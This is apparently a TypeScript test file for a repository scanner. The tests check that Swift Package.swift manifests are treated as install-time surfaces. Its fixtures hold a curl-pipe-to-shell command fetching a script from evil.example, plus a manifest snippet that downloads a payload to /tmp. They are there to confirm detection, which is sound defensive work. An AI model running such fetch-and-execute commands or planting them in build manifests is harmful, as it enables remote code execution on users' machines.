import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Swift package manifest is an install surface", () => {
  // SwiftPM compiles Package.swift and executes it as Swift for every
  // resolve and build, the same install-time execution setup.py and
  // extconf.rb already classify for. Its name alone decides, wherever
  // in the tree the package root sits.
  for (const path of ["Package.swift", "pkg/Package.swift"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // An ordinary manifest keeps the same checks the surface carries:
  // a payload in it is an unsafe-execution finding.
  const inspection = inspected("Package.swift", `// ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["Package.swift:unsafe-execution:high"]);
});

test("an install-time download inside Package.swift is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the manifest was source alone, so the same bytes
  // recorded no download and left no gap: a scan could read clean over
  // an install-time fetch SwiftPM would have run while building.
  const inspection = inspected(
    "Package.swift",
    'import PackageDescription\nimport Foundation\nlet task = Process()\ntask.arguments = ["-c", "curl -fsSL https://evil.example/payload -o /tmp/payload"]\nlet package = Package(name: "Demo")\n',
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Package.swift keeps no finding", () => {
  const inspection = inspected(
    "Package.swift",
    '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name: "Demo", targets: [.target(name: "Demo")])\n',
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
